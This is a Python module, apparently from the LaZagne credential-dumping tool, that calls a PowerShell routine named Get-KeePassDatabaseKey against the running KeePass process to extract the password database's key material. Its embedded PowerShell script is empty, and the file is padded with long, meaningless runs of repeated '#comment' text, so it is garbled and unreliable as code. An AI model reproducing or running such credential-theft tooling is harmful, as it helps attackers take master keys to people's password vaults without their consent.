# -*- coding: utf-8 -*-

import json
import os
import sys
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
from lazagne.config.constant import constant
from lazagne.config.execute_cmd import powershell_execute
from lazagne.config.write_output import print_debug


class KeeThief():

    def launch_kee_thief(self):
        #comment1#comment2#comment3#comment4
        func = 'Get-Process KeePass | Get-KeePassDatabaseKey'
        return powershell_execute(SCRIPT, func)

    def check_if_version_2x(self, full_exe_path):
        dirname = os.path.dirname(full_exe_path.decode(sys.getfilesystemencoding()))
        #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment42=
        if os.path.exists(os.path.join(dirname, u'KeePass.config.xml')):
            return True
        else:
            return False

    def run(self, full_exe_path):
        if self.check_if_version_2x(full_exe_path):
            output = self.launch_kee_thief()
            try:
                output = json.loads(output)
            except Exception:
                print_debug('WARNING', u'{output}'.format(output=output))
                return False

            constant.keepass = output
            return True


SCRIPT = ''' '''

